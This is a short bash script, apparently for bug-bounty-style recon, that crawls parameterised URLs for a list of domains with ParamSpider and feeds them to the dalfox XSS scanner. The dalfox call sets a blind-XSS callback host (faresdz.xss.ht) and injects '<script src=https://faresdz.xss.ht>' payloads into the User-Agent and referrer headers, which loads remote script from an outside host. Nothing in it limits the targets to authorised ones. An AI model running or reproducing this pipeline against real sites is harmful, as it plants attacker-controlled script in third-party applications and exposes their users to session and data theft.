#!/bin/bash

for i in `cat $1`;do
	python3 ~/tools/ParamSpider/paramspider.py -d $i --exclude jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt,js
done;

cd output

cat *.txt > xss.txt

cat xss.txt | dalfox pipe  --mining-dict ~/tools/Arjun/db/params.txt --skip-bav -b faresdz.xss.ht -H "User-Agent:xxxx'><script src=https://faresdz.xss.ht></script>" -H "referrer: xxx'><script src=https://faresdz.xss.ht></script>"
